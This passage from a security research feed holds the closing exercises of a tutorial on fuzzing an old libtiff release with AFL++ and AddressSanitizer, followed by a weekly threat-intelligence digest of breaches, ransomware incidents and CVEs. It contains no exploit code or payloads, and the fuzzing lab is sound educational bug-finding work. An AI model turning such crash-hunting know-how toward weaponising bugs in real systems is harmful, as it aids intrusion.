class=\"wp-block-heading\">Guidance</h2>\n\n\n\n<p>To solve the exercise, make the necessary modifications to <code>loadtiff.c</code>: that is, add the correct path to the file <code>tiffio.h</code> and then the invocations of the functions <code>TIFFOpen</code> and <code>TIFFClose</code> where they are missing (you will have to consult the libtiff documentation to understand how to do this). Then run <code>make loadtiff</code>. Once compilation succeeds, run the <code>loadtiff</code> executable on the file <code>brain.tif</code> (available in the <code>samples</code> directory of the git repository, <a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/tree/main/samples\">here</a>). This is done by simply running <code>./loadtiff /path/to/brain.tif</code>. Verify that you get the output message <code>TIFF load successful!</code>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Files</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/0_dry_run/Makefile\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/0_dry_run/loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Solution</h2>\n\n\n\n<ul>\n<li><strong>Makefile</strong> &#8212; requires no modifications, above file can be used as-is</li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/0_dry_run/sol_loadtiff.c\">loadtiff.c</a><br /></li>\n</ul>\n\n\n\n<p><br />If you have successfully run <code>loadtiff</code><code class=\"EnlighterJSRAW\"> </code>on an input TIFF file and received the message <code>TIFF load successful!</code> then you have cleared the sanity check: that is, you can compile a simple program that makes use of libtiff&#8217;s facilities for reading and manipulating TIFF files. Without reaching this milestone there is little point in attempting the other exercises.<br /></p>\n\n\n\n<h1 class=\"wp-block-heading\">Exercise 1 \u2014 Custom Compilation with AFL++ and ASAN</h1>\n\n\n\n<p>The good news is that there is nothing to solve in this exercise. It is a repeat of exercise 0 with one additional terminal command, which is provided to you in its entirety. The bad news is that to get to that part, we lead with several paragraphs explaining what this one additional terminal command does, a la <a href=\"https://www.smithsonianmag.com/history/charles-proteus-steinmetz-the-wizard-of-schenectady-51912022/\">Charles Steinmetz&#8217;s famous $10,000 chalk mark</a>.</p>\n\n\n\n<p>Fuzzing is an easy concept, but is not so easy to implement. It involves feeding a program different inputs and observing if and how its execution path changes. The task can be explained to a five-year-old, but how would you explain it to a computer? &#8220;Take this program, and whenever you see an <code>if</code> statement, you should &#8212; &#8221; but there is no API that can elegantly engage with the problem on that level. The foundation isn&#8217;t there. This is a, how do they call it, &#8220;Semantic Gap&#8221;.</p>\n\n\n\n<p>AFL++ (American Fuzzy Lop plus plus) solves the above conundrum the hard way. It reads the program source and painstakingly assembles a meta-program that supports running the original program again and again, trying various inputs, and reacting based on the original program behavior. Therefore, from a certain point of view, AFL++ is a compiler &#8212; one that, it should be clear now, abstracts away a truly enormous amount of developer suffering. Appropriately, then, AFL++ is implemented as a drop-in replacement for <code>gcc</code>.</p>\n\n\n\n<p>Under the hood, AFL++ uses a genetic approach to generating program inputs; this means that inputs that caused the program to reach a novel state of execution are used as a baseline when trying to find further such inputs, by introducing partially random perturbations which are chosen with some thought (what if we pretend this byte is an integer, and add 1? What if we pretend it is a bitmask, and perform a logical <code>not</code> operation? And so on).</p>\n\n\n\n<p>ASAN stands for &#8220;address sanitizer&#8221; and it&#8217;s an open source programming tool by Google that detects memory corruption bugs such as buffer overflows or accesses to a dangling pointer (use-after-free). Similarly to AFL++, it intercedes during the compilation process; but as opposed to AFL++ which changes the whole nature of the program, ASAN mainly makes the experience of running into memory corruption bugs cozier. You&#8217;ve surely seen a C program produce an access violation (&#8220;segmentation fault&#8221;) &#8212; indeed, the early stages of learning C language involve an intense effort of getting a program to do anything else &#8212; and what ASAN does is temper this experience with some context and colorful output. Programs compiled with ASAN will produce pretty-prints and detailed diagnostics when they encounter a memory management error. While this is not strictly necessary for finding bugs, it is very helpful when triaging them and trying to understand their root cause. Unless the drunk random walk of inputs produced by AFL++ magically produces a fully-formed exploit (spoiler: this is unlikely), chances are you will first run into a bug in the form of the original program violently dying, and ASAN will help you get the investigation started.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Guidance, Exercise &amp; Solution</h2>\n\n\n\n<p>Let&#8217;s compile a new version of <code>libtiff</code> with AFL++, with the ASAN flag set. The easiest way to coerce the project to do this for us instead of using vanilla <code>gcc</code> is by using the <code>configure</code> command. Perform the following steps:</p>\n\n\n\n<ul>\n<li>Install AFL++, if it is not installed already: <code>sudo apt install afl++</code></li>\n\n\n\n<li>recompile libtiff with AFL++ and ASAN. Go back to the <code>libtiff-Release-v4-0-6</code> directory and do:<ul><li><code>make clean</code> (in case you have leftover object files from previous build)</li><li><code>make</code></li><li><code>cd /usr/src/libtiff-Release-v4-0-6/libtiff</code></li><li><code>mv mkg3states.o mkg3states.o.bkp</code> (again)</li><li>Then: (take a deep breath!) <code>./configure i686-pc-linux-gnu CC=afl-gcc CXX=afl-g++ CFLAGS=\"-lasan -fsanitize=address -m32 -g -O2\" CXXFLAGS=\"-lasan -fsanitize=address -m32 -g -O2\"</code></li></ul>This inexcusable piece of code is simply telling libtiff\u2019s complex build system to use <code>afl-gcc</code> instead of <code>gcc</code>, and use the correct flags to invoke ASAN during compilation (as well as some more prosaic settings, such as declaring a certain machine code optimization level and asking for 32-bit output).</li>\n</ul>\n\n\n\n<p>Now, go back to your code from exercise 0, compile and run it again. Verify that you get the message <code>TIFF load successful!</code> again.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27533\" height=\"73\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/1_afl_compile.png\" width=\"719\" /><figcaption class=\"wp-element-caption\">Figure 1 &#8211; Expected output of AFL++ compilation.</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Exercise 2 \u2014 Forcing use of the standard input; basic TIFF functions</h1>\n\n\n\n<p>There is one final obstacle that needs to be cleared before we can perform an actual fuzz: the program we have written, <code>loadtiff</code>, is not actually the right shape to be used by AFL++. When AFL++ performs fuzzing, it takes candidate inputs and feeds them to the fuzzed program via the standard input. You&#8217;ll note that so far our <code>loadtiff</code> has taken its input in the form of a file, with the file name provided to the program as an argument; we have to rectify that. Also, we are going to dip our feet into doing something slightly less trivial with the libtiff API itself, so that we get used to the idea of using the API to interact with a TIFF image rather than just loading it into memory as a TIFF object. These two steps forward are completely orthogonal to each other, we could do just one without the other.</p>\n\n\n\n<p>We&#8217;ve set the bar to clear for &#8220;interacting with the image in a slightly less trivial way&#8221; to be the most straightforward we can think of: printing the image&#8217;s width and height (henceforth \u201clength\u201d, because that\u2019s the terminology libtiff uses). This simple task still requires consulting the libtiff API documentation and understanding how to use it, a basic skill without which the exercise after this one would probably be biting off more than we can chew. Also, if need be, this is your chance to read the solution and get the hang of using the API to do more than just load an object, without spoiling the whole solution for the next exercise where we perform an actual fuzz.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Guidance</h2>\n\n\n\n<ul>\n<li>Make the necessary modifications to the file <code>loadtiff.c</code>.\n<ul>\n<li>Again, in this exercise the complete Makefile is given to you and requires no modifications.</li>\n\n\n\n<li>Where prompted, read <code>BUF_SIZE</code> from the standard input and write the read bytes to the temp file. You have already been given <code>BUF_SIZE</code> and a pointer to the temp file.</li>\n\n\n\n<li>Open the temp file as a TIFF object \u2014 after exercise 0 you should already know how to do this.</li>\n\n\n\n<li>Use the function <code>TIFFGetField</code> to obtain the resulting TIFF object\u2019s width and length, and populate the aptly-named variables <code>width</code> and <code>length</code>. You will need to consult the documentation for the <code>TIFFGetField</code> function to see how to do this.</li>\n</ul>\n</li>\n\n\n\n<li>run <code>make loadtiff</code>.</li>\n\n\n\n<li>Test your solution: <code>./loadtiff &lt; ../samples/brain.tif</code> and verify that the image width and length are printed.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Files</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/2_stdin_basic_tiff/Makefile\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/2_stdin_basic_tiff/loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Solution</h2>\n\n\n\n<ul>\n<li><strong>Makefile</strong> &#8212; requires no modifications, above file can be used as-is</li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/2_stdin_basic_tiff/sol_loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27534\" height=\"90\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/2_stdin_basic_tiff.png\" width=\"722\" /><figcaption class=\"wp-element-caption\">Figure 2 &#8211; Expected output of exercise 2 test.</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Exercise 3 \u2014 Basic Harness and Fuzz</h1>\n\n\n\n<p>That&#8217;s it, we&#8217;re ready to actually run AFL++. In this exercise we will learn how to invoke <code>afl-fuzz</code>, which sets off the actual fuzzing process. Also, instead of just printing the image width and length, we will give the fuzzer something more substantial to chew on: parsing a TIFF image and converting it into a different format.</p>\n\n\n\n<p>Why all this busywork? Couldn&#8217;t we have just focused on running <code>afl-fuzz</code>? Well, yes, technically we could have. But think about what our current version of <code>loadtiff</code> does; it loads a given TIFF image and prints two properties that are stored neatly in the image header. Now recall that the goal of this entire process is to find bugs &#8212; that is, the program failing in some nontrivial way to do what it set out to do. How can the program fail at reading some bytes out of a header? Very barely. Maybe the header says something nonsensical, like the length of the image is a negative 7 pixels, so the program dutifully prints that information; that&#8217;s not a bug, it&#8217;s a party trick for a junior high LAN party, and we&#8217;re being generous. <code>afl-fuzz</code> can test inputs on the program from exercise 2 for months without encountering a single fatal error, and that&#8217;s not a useful result. To put it in concise Cochran form: If the program won&#8217;t crash, <code>ctrl+C</code> back to <code>bash</code>.</p>\n\n\n\n<p>You know you have finished the exercise when you are looking at the AFL++ status display and new crashes appear occasionally, but not constantly. If new crashes appear constantly chances are there is a serious bug in <code>loadtiff.c</code> itself, rather than libtiff. Theoretically speaking, if crashes do not appear at all, then either the harness does not invoke the library logic in an invasive enough fashion, or else none of the bugs in the library are of the sort a fuzzer will find (or maybe the program being analyzed has no bugs, but it is a known result in empirical computer science that there are no such programs). We&#8217;ve picked an old version of libtiff to rid you of this consideration: there are definitely bugs that the above harness can find, once completed, and the first one will probably pop up within a few minutes.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Guidance</h2>\n\n\n\n<p>The exercise itself is comprised of two main tasks. The first is adding a <code>fuzz</code> item to the makefile that will invoke the correct command line to launch <code>afl-fuzz</code> and begin the fuzzing process. This also requires setting up the input and output directories; the input directory should be the <code>samples</code> directory (download it from the lab\u2019s git repository <a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/tree/main/samples\">here</a> if you don\u2019t have it), and <code>afl-fuzz</code> needs to be explicitly told to use it as the input directory. The output directory should be an empty directory named <code>out</code>. Also, the exercise calls for limiting the memory used by <code>afl-fuzz</code> to 900MB. Consult the documentation of <code>afl-fuzz</code> in order to understand how do this properly.</p>\n\n\n\n<p>The second task is modifying <code>loadtiff.c</code> to convert the input TIFF image to an RGB raster &#8212; an action that actually requires meaningfully parsing and evaluating TIFF logic, and might lead to the program mishandling input. This requires correctly setting the value of a variable named <code>raster_size</code> that controls the size of the allocated RGB raster, As well as correctly using the libtiff API functions <code>TIFFRGBAImageBegin</code>, <code>TIFFRGBAImageGet</code>, and <code>TIFFRGBAImageEnd</code>. Consult the documentation of these functions to understand how to invoke them correctly.</p>\n\n\n\n<p>Once you&#8217;ve done all that you can run <code>make fuzz</code> and check the <code>crashes</code> directory for some choice inputs that supposedly make <code>loadtiff</code> crash. Test the crash by feeding it into <code>loadtiff</code> as input.</p>\n\n\n\n<p>To complete the exercise:</p>\n\n\n\n<ul>\n<li>Make the modifications described above to the files <code>Makefile</code> and <code>loadtiff.c</code>.</li>\n\n\n\n<li>Run <code>make loadtiff</code>.</li>\n\n\n\n<li>Verify that you have the <code>samples</code> directory, and ensure the command line in <code>Makefile</code> that invokes <code>afl-fuzz</code> names it as the input directory.</li>\n\n\n\n<li><code>mkdir out</code> &#8212; you will need this directory later.</li>\n\n\n\n<li>Test your solution: <code>make fuzz</code>.</li>\n\n\n\n<li>If AFL++ prompts you to make changes to your OS configuration, do so. Repeat until AFL++ is satisfied.</li>\n\n\n\n<li>Follow the AFL++ results and verify that they make sense: There is no huge torrent of crashes, but if you wait a while, a crash emerges eventually. If the progress chart doesn&#8217;t display prettily, try a different terminal program (e.g. we&#8217;ve had luck trying <code>qterminal</code> when our <code>gnome-terminal</code> color scheme didn&#8217;t play well with <code>afl-fuzz</code>).</li>\n\n\n\n<li>Verify a crash manually: <code>tiff_to_rgb &lt; ./out/crashes/pick_your_favorite_file_from_here</code>.</li>\n</ul>\n\n\n\n<p><strong>IMPORTANT!:</strong> If you are still not getting any crashes even if you copy-paste the given solution, and suspect that the issue is the exec speed, you can go directly to the next exercise to verify your suspicion.<br /></p>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Files</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/3_basic_harness_fuzz/Makefile\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/3_basic_harness_fuzz/loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Solution</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/3_basic_harness_fuzz/Makefile.sol\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/3_basic_harness_fuzz/sol_loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27535\" height=\"549\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/3_afl_progress.png\" width=\"810\" /><figcaption class=\"wp-element-caption\">Figure 3-  A progress report for an ongoing AFL++ fuzzer session. The exec speed isn&#8217;t so great.</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Exercise 4 &#8212; Make it Faster! &#8212; example cherry-picking and parallelism</h1>\n\n\n\n<p>We could have stopped at exercise 3, but that&#8217;d be doing you a disservice. If you look closely enough at the <code>afl-fuzz</code> display panel, you may notice that a few seconds into the fuzzing, the exec speed sees a major drop &#8211; to the double and single digits. Running a program 15 times a second can barely be called &#8220;fuzzing&#8221;, and AFL++ even chastises us with a red <code>(zzzz...)</code> next to that statistic.</p>\n\n\n\n<p>What can we do? Several things:</p>\n\n\n\n<ul>\n<li>Optimize the code. Only allocate memory and compute values once we&#8217;re sure we&#8217;ll be using them soon.</li>\n\n\n\n<li>Reduce the size of input samples. Most unusual input can be crafted on minimalist examples, and using examples that weigh dozens of KBs is a waste of computing resources.</li>\n\n\n\n<li>Leverage AFL++&#8217;s support for parallelism: AFL++ has a simple-to-use feature where one of its instances runs as a primary fuzzer, and the rest run as secondary fuzzers. The fuzzers cooperate and share interesting test cases, and fuzzing speed increases dramatically. You can run <code>afl-gotcpu</code> to see whether you have enough resources to launch additional fuzzers in parallel.</li>\n</ul>\n\n\n\n<p>There&#8217;s one thorny issue, though &#8212; the code we wrote doesn&#8217;t support parallelism! It converts the TIFF given to it via standard input to a file, but that file name is the same for every running instance of the program. If we run several instances in parallel, they will step all over each other and we will get very unpredictable results (this is reflected in the &#8220;stability&#8221; metric dropping dramatically; when all is well, in this deterministic program stability should be 100%.) Since every output file lives for a very short amount of time, and we can live with the very rare collision, for our purposes it is enough to introduce some quick and dirty randomization to the output file name by appending some random characters to it.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Guidance</h2>\n\n\n\n<p>The below exercise is about implementing some of the changes described above. First, you should create a <code>prepare_samples</code> makefile item that sifts through the TIFF images in the <code>samples</code> directory and deletes all files larger than a certain threshold (the sweet spot during our own tests seemed to be 1KB). Second, you should create a <code>fuzz</code> makefile item, that now instead of running the single-instance serial <code>afl-fuzz</code>, runs <code>afl-fuzz</code> in parallel mode; this requires several commands, and you will have to consult the AFL++ documentation to understand how to do it.</p>\n\n\n\n<p>As for <code>loadtiff.c</code>, in this exercise the one modification to it is adding support for randomized output file names. This involves reading pseudorandom bytes from <code>/dev/urandom</code> and using them to pseudorandomly pad the output file names with some well-behaved printable characters.</p>\n\n\n\n<p>To complete this exercise</p>\n\n\n\n<ul>\n<li>Make the modifications described above to the files <code>Makefile</code> and <code>loadtiff.c</code>}.</li>\n\n\n\n<li>Run <code>make loadtiff</code>.</li>\n\n\n\n<li><code>mkdir out</code> &#8212; you will need this directory later.</li>\n\n\n\n<li>Test your solution: <code>make fuzz</code>.</li>\n\n\n\n<li>Browse the 3 running instances of <code>afl-fuzz</code> and verify the improvement in exec speed.</li>\n\n\n\n<li>Run: <code>afl-whatsup ./out</code> and observe the output.</li>\n\n\n\n<li>If you find a crash, verify it manually: <code>./loadtiff &lt; ./out/crashes/pick_your_favorite_file_from_here</code>.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Files</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/4_make_it_faster/Makefile\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/4_make_it_faster/loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\">Exercise Solution</h2>\n\n\n\n<ul>\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/4_make_it_faster/Makefile.sol\">Makefile</a></li>\n\n\n\n<li><a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab/blob/main/4_make_it_faster/sol_loadtiff.c\">loadtiff.c</a></li>\n</ul>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27536\" height=\"644\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/4_afl_whatsup.png\" width=\"493\" /><figcaption class=\"wp-element-caption\">Figure 4 &#8211; A report generated by the afl-whatsup tool.</figcaption></figure></div>\n\n\n<h1 class=\"wp-block-heading\">Conclusion</h1>\n\n\n\n<p>Fuzzing enjoys a somewhat notorious reputation as a bug finding technique for people who aren&#8217;t hardcore enough to squint at disassembly and manually fish out a use-after-free. We recall reading a succinct and relatable social media post that said, more or less: &#8220;I spend hours sifting through a program to find a bug only to hear that, using the same time investment, some idiot with a fuzzer just found 50&#8221;. Well, congratulations: now you, too, can be that idiot with a fuzzer! In all seriousness, automation is the future, and the real question should be how to make fuzzers <em>also</em> find the one bug that AFL++ could not find, and that required a trained human eye to tease out. If you liked toying with AFL++, you might want to look into tools that reach for that goal, and try to push the boundaries of how clever the &#8220;clever guessing&#8221; can get when mutating inputs &#8212; such as <a href=\"https://github.com/SoftSec-KAIST/Eclipser\">Eclipser</a> and <a href=\"https://github.com/shellphish/driller\">Driller</a>.</p>\n\n\n\n<p>Our special thanks go to Eyal Itkin for his technical advisory of this project. </p>\n\n\n<p>The post <a href=\"https://research.checkpoint.com/2023/the-blitz-tutorial-lab-on-fuzzing-with-afl/\" rel=\"nofollow\">The Blitz Tutorial Lab on Fuzzing with AFL++</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "6th March \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "6th March \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/6th-march-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/6th-march-threat-intelligence-report/",
            "authors": [
                {
                    "name": "lorenf"
                }
            ],
            "author": "lorenf",
            "author_detail": {
                "name": "lorenf"
            },
            "published": "Mon, 06 Mar 2023 14:24:30 +0000",
            "published_parsed": [
                2023,
                3,
                6,
                14,
                24,
                30,
                0,
                65,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27554",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 6th March, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES The American fast food chain Chick-fil-A has released an announcement revealing a credential stuffing attack occurred on their website and mobile app. The attack exposed over 71K customers&#8217; accounts data, including names, email [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-march-threat-intelligence-report/\" rel=\"nofollow\">6th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 6th March, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES The American fast food chain Chick-fil-A has released an announcement revealing a credential stuffing attack occurred on their website and mobile app. The attack exposed over 71K customers&#8217; accounts data, including names, email [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-march-threat-intelligence-report/\" rel=\"nofollow\">6th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 6th March, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/03/Threat_Intelligence_News_2023-03-06.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHES</strong></p>\n<ul>\n<li>The American fast food chain Chick-fil-A <a href=\"https://www.bleepingcomputer.com/news/security/chick-fil-a-confirms-accounts-hacked-in-months-long-automated-attack/\">has released</a> an announcement revealing a credential stuffing attack occurred on their website and mobile app. The attack exposed over 71K customers&#8217; accounts data, including names, email addresses, mobile payment numbers and masked credit or debit card numbers, and threat actors may have used account balance to make purchases<strong>.</strong></li>\n<li>Pierce Transit, a public transit operator that serves over 18K people daily in Washington State, <a href=\"https://therecord.media/pierce-transit-washington-ransomware-attack-lockbit/\">has been</a> a victim of a ransomware attack conducted by LockBit gang. The ransomware group claimed it stole correspondence, non-disclosure agreements, customer data, contracts and more.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point Threat Emulation and Harmony Endpoint provide protection against this threat</em> <em>(Ransomware.Win.Lockbit)</em></p>\n<ul>\n<li>Satellite TV giant Dish Network <a href=\"https://www.securityweek.com/dish-network-says-outage-caused-by-ransomware-attack/\">confirmed</a> it has been a victim of a ransomware attack. The attack caused an internal systems outage that affected the company\u2019s internal communications, customer call centers, and websites. In addition, the threat actors extracted data that possibly include personal information. Researchers indicated that Black Basta ransomware operation is behind the attack, however the ransomware group has not yet claimed responsibility for the hack.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point Threat Emulation and Harmony Endpoint provide protection against this threat</em> <em>(Ransomware.Win.BlackBasta)</em></p>\n<ul>\n<li>Digital banking platform Hatch Bank <a href=\"https://www.bleepingcomputer.com/news/security/hatch-bank-discloses-data-breach-after-goanywhere-mft-hack/\">has become</a> the second known victim (after Community Health Systems in February) of the remote code execution vulnerability in Fortra\u2019s GoAnywhere file-transfer software (tracked as CVE-2023-0669). The Cl0p ransomware gang has claimed responsibility for the attack, claiming to have also stolen data from 130 additional organizations.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point IPS, Threat Emulation and Harmony Endpoint provide protection against this threat</em> <em>(GoAnywhere MFT Insecure Deserialization (CVE-2023-0669); Ransomware.Win.Clop)</em></p>\n<ul>\n<li>The websites of nine hospitals in Denmark <a href=\"https://therecord.media/danish-hospitals-hit-by-cyberattack-from-anonymous-sudan/\">have been</a> shut down due to distributed-denial-of-service (DDoS) attacks performed by a relatively new hacktivists group known as Anonymous Sudan. According to the group\u2019s Telegram channel, the group warned it would attack Denmark healthcare infrastructure after an activist burned a Koran in front of the Turkish embassy in Stockholm.</li>\n<li>British retailer WH Smith <a href=\"https://www.bbc.com/news/business-64823923\">suffered</a> a data breach in which personal information of former and current employees was leaked, including names, addresses, National Insurance numbers and dates of birth. The company stated that there has been no impact on the trading activities of the group.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>Researchers <a href=\"https://www.rapid7.com/blog/post/2023/03/01/etr-active-exploitation-of-zk-framework-cve-2022-36537/\">have released</a> a report on ZK Framework vulnerability (tracked as CVE-2022-36537) in ConnectWise R1Soft Server Backup Manager software. The information disclosure vulnerability could lead to remote code execution and the installation of malicious drivers that function as backdoors.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point IPS provides protection against this threat</em> <em>(ZKoss Authentication Bypass(CVE-2022-36537))</em></p>\n<ul>\n<li>Microsoft <a href=\"https://betanews.com/2023/03/03/microsoft-releases-emergency-patches-for-intel-cpu-vulnerabilities-in-windows-10-windows-11-and-windows-server/\">has issued</a> six out-of-band security updates for &#8216;Memory Mapped I/O Stale Data (MMIO)&#8217; information disclosure vulnerabilities in Intel CPUs (tracked as CVE-2022-21123, CVE-2022-21125, CVE-2022-21127 and CVE-2022-21166). Successful exploitation might allow an attacker to read privileged data across trust boundaries.</li>\n<li>Cisco <a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ip-phone-cmd-inj-KMFynVcP\">has published</a> an advisory of critical severity vulnerabilities (tracked as CVE-2023-20078 and CVE-2023-20079) impacting 6800, 7800, and 8800 series IP phones. Successful exploitation might cause a remote command execution on the affected system.</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Researchers have <a href=\"https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\">analyzed</a> the increasing use of Microsoft OneNote documents to deliver malware. This trend is gaining popularity following the fact that Microsoft disabled macros by default, minimizing the effectiveness of Office documents as attack vectors, and given that OneNote can also run scripts.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point Harmony Endpoint provides protection against this threat</em> <em>(Exploit.Win.OneNote)</em></p>\n<ul>\n<li>Researchers <a href=\"https://unit42.paloaltonetworks.com/lokibot-spike-analysis/\">have uncovered</a> a malware distribution campaign that is delivering the LokiBot information stealer via business email compromise (BEC) phishing emails. This malware is designed to steal sensitive information from victims&#8217; systems, such as passwords and banking information.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point Threat Emulation, Harmony Endpoint and Anti-Bot provide protection against this threat</em> <em>(Botnet.Win.Lokibot)</em></p>\n<ul>\n<li>Researchers <a href=\"https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/\">have analyzed</a> MQsTTang, a new custom backdoor used by the Chinese APT group Mustang Panda (aka PlugX) as part of an ongoing campaign targeting political and governmental organizations in Europe and Asia. MQsTTang backdoor might allow the attacker to execute arbitrary commands on a victim\u2019s machine.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check </em><em>Point Threat Emulation, Harmony Endpoint and Anti-Bot provide protection against this threat</em> <em>(RAT.Win.PlugX)</em></p>\n<ul>\n<li>The cyberespionage APT group Iron Tiger (aka APT27, Emissary Panda, IronPanda) <a href=\"https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html\">has made</a> an update to the custom malware family called SysUpdate. The new version includes new features and components that enable the malware to compromise Linux systems.</li>\n</ul>\n<p>The post <a href=\"https://research.checkpoint.com/2023/6th-march-threat-intelligence-report/\" rel=\"nofollow\">6th March \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "27th February \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "27th February \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/27th-february-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/27th-february-threat-intelligence-report/",
            "authors": [
                {
                    "name": "dants"
                }
            ],
            "author": "dants",
            "author_detail": {
                "name": "dants"
            },
            "published": "Mon, 27 Feb 2023 16:07:21 +0000",
            "published_parsed": [
                2023,
                2,
                27,
                16,
                7,
                21,
                0,
                58,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27516",
            "guidislink": false,
